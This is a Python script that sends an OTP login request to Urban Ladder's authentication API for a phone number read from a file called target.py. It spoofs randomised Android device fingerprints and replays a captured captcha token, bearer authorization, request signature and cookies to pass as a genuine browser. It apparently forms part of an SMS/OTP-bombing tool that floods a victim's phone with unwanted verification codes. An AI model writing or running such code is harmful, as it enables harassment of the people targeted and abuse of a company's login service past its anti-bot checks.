import json
import random
from typing import Any
import requests

OTP_API_URL = "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        payload = {
            "mobile": number,
            "country_code": "91",
            "captcha_code": "grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzkzMjM1NTk0MDYxfQ.qxbqxNweMcb6VJiACOoSbs6KZEHcDJK4FXyYN6VbloM"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': device["platform"],
            'authorization': "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            'sec-ch-ua': device["secChUa"],
            'sec-ch-ua-mobile': device["mobile"],
            'baggage': "sentry-environment=production,sentry-release=v2.19.0,sentry-public_key=bc42a178b0f9a328e18c2916be17c347,sentry-trace_id=ac4b9103bf3b477a945c4293efe712ff,sentry-org_id=71740,sentry-sampled=false,sentry-sample_rand=0.9900281465780318,sentry-sample_rate=0.1",
            'x-fp-signature': "v1.1:1e03fe5b2ff6d2d0995a533aedc3f7ece1ccb0dd3bf89b3656d8d038f18508ef",
            'sentry-trace': "ac4b9103bf3b477a945c4293efe712ff-8dabc618a1342d16-0",
            'x-fp-date': "20261029T005954Z",
            'x-fp-sdk-version': "1.4.15-alpha.1753175666",
            'x-currency-code': "INR",
            'origin': "https://www.urbanladder.com",
            'x-requested-with': "mark.via.gp",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.urbanladder.com/auth/login",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "anonymous_id=66a31b6dd5274c0ba3258dba47dd523d; old_browser_anonymous_id=66a31b6dd5274c0ba3258dba47dd523d; _pk_id.1.bb15=0d2dee0247bdc6b9.1793235583.; _pk_ses.1.bb15=1"
        }

        resp = requests.post(
            OTP_API_URL,
            headers=headers,
            json=payload,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
